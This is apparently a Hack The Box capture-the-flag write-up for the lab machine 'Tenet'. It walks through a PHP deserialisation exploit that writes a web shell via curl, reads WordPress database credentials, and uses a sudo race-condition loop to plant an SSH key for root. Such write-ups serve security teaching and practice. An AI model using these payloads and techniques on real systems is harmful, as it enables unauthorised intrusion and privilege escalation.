# Tenet

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.1  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 08:28 EDT
Nmap scan report for 10.129.85.1
Host is up (0.0071s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Another web-based exploit. We have to add `tenet.htb` to our `/etc/hosts` file to view the website.

### Tenet PHP Deserialisation

The machine has a blog-like website:

<figure><img src="../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

This is a Wordpress based site if we view the page source. If we view some of the comments within the pages, we can see this comment that points us towards another file:

<figure><img src="../../../.gitbook/assets/image (3351).png" alt=""><figcaption></figcaption></figure>

Visiting `sator.php` won't do anything. Instead, visit`http://<IP>/sator.php.bak`, and it would download file to our machine. Then, we can view the file contents:

```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

This was an obvious deserialisation exploit at the `sator.php` file hosted on the IP address. As such, we can create this small bit of code that would write a new file to the machine.

```php
<?php

class DatabaseExport {

    public $file = "cmd.php";
    public $data = '<?php system($_REQUEST["cmd"]); ?>';

}

$input = new DatabaseExport;
echo serialize($input);
?>
```

When run in PHP, it wouuld create a PHP Serialised object. Then, we just need to send that within the `arepo` parameter in a GET request to `sator.php`:

```
$ curl -G --data-urlencode 'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:7:"cmd.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}' http://10.129.85.1/sator.php
```

Afterwards, we can confirm we have RCE on the machine:

```
$ curl http://10.129.85.1/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Just spawn a reverse shell using a basic `bash` shell next.

<figure><img src="../../../.gitbook/assets/image (740).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Wordpress Credentials

Now that we are in, we can read the `wp-config.php` file. We would find some credentials in it:

```
/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

We can then just `su` to `neil` and grab the user flag.

### Sudo Race Condition

When we check `sudo` privileges, we see this:

```
www-data@tenet:/var/www/html$ sudo -l
Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

Here's the script:

```bash
#!/bin/bash

checkAdded() {
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi
}

checkFile() {
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
                /bin/echo "Error in creating key file!"
                if [[ -f $1 ]]; then /bin/rm $1; fi
                exit 1
        fi
}

addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key >>$tmpName
        checkFile $tmpName
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        /bin/rm $tmpName
}
```

This script is a classic example of a race condition attack. Since the key is temporarily created within the `/tmp` directory before being added to the `authorized_keys` folder of `root`, we can intercept the response by having a loop running within the `/tmp` directory that checks for the key's creation, then overwrite the file with my own key.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># in first SSH shell
while true; do for file in /tmp/ssh-*; do echo 'YOUR KEY VALUE' > $file ; done; done
# in another
<strong>while true; do sudo /usr/local/bin/enableSSH.sh; done
</strong><strong>
</strong><strong># alternatively, run this script
</strong>#!/bin/bash

while true; do
        cat id_rsa.pub | tee /tmp/ssh-*
        sudo /usr/local/bin/enableSSH.sh
done
</code></pre>

After a while, we should get an error like this:

<figure><img src="../../../.gitbook/assets/image (3612).png" alt=""><figcaption></figcaption></figure>

Then we can just SSH to `root`.

<figure><img src="../../../.gitbook/assets/image (2205).png" alt=""><figcaption></figcaption></figure>

Rooted!
